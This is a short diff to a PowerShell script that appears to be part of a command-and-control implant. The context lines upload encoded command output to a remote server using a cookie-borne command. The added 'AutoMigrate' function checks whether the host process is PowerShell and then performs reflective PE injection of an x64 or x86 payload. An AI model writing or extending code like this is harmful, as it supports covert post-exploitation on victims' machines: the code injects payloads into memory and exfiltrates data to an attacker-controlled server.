@@ -471,3 +471,14 @@ Function Get-Webpage {
     $UploadBytes = getimgdata $Output
     (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
 }
+Function AutoMigrate {
+if (($p = Get-Process | ? {$_.id -eq $pid}).name -eq "powershell") {
+    $t=$true
+}
+if ($t -and [IntPtr]::size -eq 8){
+    invoke-reflectivepeinjection -payload x64
+} 
+elseif (($t -and [IntPtr]::size -eq 4)) {
+    invoke-reflectivepeinjection -payload x86
+}
+}
